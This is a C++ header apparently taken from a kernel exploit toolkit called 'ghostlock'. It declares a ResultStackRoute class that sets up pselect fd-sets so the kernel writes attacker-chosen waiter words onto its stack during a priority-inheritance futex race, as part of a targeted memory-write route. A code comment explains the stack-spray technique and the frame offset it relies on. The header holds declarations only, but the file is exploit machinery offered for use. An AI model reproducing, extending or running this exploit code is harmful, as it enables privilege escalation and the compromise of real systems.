#ifndef GHOSTLOCK_RESULT_STACK_ROUTE_H
#define GHOSTLOCK_RESULT_STACK_ROUTE_H

#include "memory/payload_builder.h"
#include "race/pi_race.h"
#include "profile/model.h"
#include "route/route_status.h"
#include "support/native_resource.hpp"

#include <sys/select.h>

#include <array>

#ifndef PSELECT_ROUTE_NFDS
#define PSELECT_ROUTE_NFDS 320
#endif

namespace ghostlock::route::result_stack {
    class FdSet final {
    public:
        void zero() noexcept { FD_ZERO(&raw_); }
        void set(int32_t fd) noexcept { FD_SET(fd, &raw_); }

        [[nodiscard]] bool test(int32_t fd) const noexcept {
            return FD_ISSET(fd, &raw_) != 0;
        }

        [[nodiscard]] fd_set *raw() noexcept { return &raw_; }
        [[nodiscard]] const fd_set *raw() const noexcept { return &raw_; }

    private:
        fd_set raw_{};
    };

    /* OPD2515's waiter starts at word 14 of pselect's saved fd-set frame. The
     * first three input sets are copied back into the three result sets, so the
     * route deliberately seeds a ready socket in all selected classes and lets
     * the kernel materialize the waiter words during the result copy. */
    class ResultStackRoute final {
    public:
        ResultStackRoute(ghostlock::race::PiRace *race,
                         const ghostlock::memory::WriteRequest *request,
                         const ghostlock::profile::TargetProfile &profile,
                         ghostlock::profile::ResultStackLayout layout,
                         const std::array<int32_t, 3> &stdio_backup) noexcept;

        ~ResultStackRoute() noexcept = default;

        ResultStackRoute(const ResultStackRoute &) = delete;
        ResultStackRoute &operator=(const ResultStackRoute &) = delete;
        ResultStackRoute(ResultStackRoute &&other) noexcept;

        [[nodiscard]] int32_t prepare() noexcept;
        [[nodiscard]] ghostlock::route::RouteStatus execute() noexcept;
        void disarm() noexcept;
        void destroy() noexcept;
        [[nodiscard]] int32_t fail(int32_t step, int32_t error_number) noexcept;

        ghostlock::race::PiRace *race = nullptr;
        const ghostlock::memory::WriteRequest *request = nullptr;
        const ghostlock::profile::TargetProfile &profile;
        ghostlock::profile::ResultStackLayout layout{};
        FdSet input_set;
        FdSet output_set;
        FdSet exception_set;
        FdSet owned_input_set;
        FdSet owned_output_set;
        FdSet owned_exception_set;
        ghostlock::support::UniqueFd ready_fd;
        ghostlock::support::UniqueFd peer_fd;
        std::array<ghostlock::support::BorrowedFd, 3> stdio_backup;
        int32_t selected_fds_installed = 0;
        int32_t consumer_stuck = 0;
        int32_t calls = 0;
        int32_t successes = 0;
        int32_t select_result = 0;
        int32_t select_errno = 0;
        ghostlock::route::RouteStatus status{};

    private:
        void close_selected_fds() noexcept;
        void retain_for_process_lifetime() noexcept;
    };
} // namespace ghostlock::route::result_stack

#endif
